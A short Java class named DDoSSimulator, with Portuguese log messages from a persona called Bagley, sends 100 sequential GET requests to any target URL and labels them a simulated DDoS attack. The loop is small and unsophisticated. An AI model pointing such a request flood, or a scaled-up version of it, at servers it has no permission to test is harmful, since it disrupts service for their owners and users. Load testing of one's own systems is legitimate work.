package com.bagley;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class DDoSSimulator {

    public void simulateAttack(String targetUrl) {
        System.out.println("Bagley: Iniciando ataque DDoS simulado em " + targetUrl);
        for (int i = 0; i < 100; i++) { // 100 requisições para simular o ataque
            try {
                sendRequest(targetUrl);
                System.out.println("Bagley: Enviando requisição " + (i + 1));
            } catch (IOException e) {
                System.out.println("Bagley: Erro ao enviar requisição: " + e.getMessage());
            }
        }
    }

    private void sendRequest(String targetUrl) throws IOException {
        @SuppressWarnings("deprecation")
        URL url = new URL(targetUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.getResponseCode();
    }
}
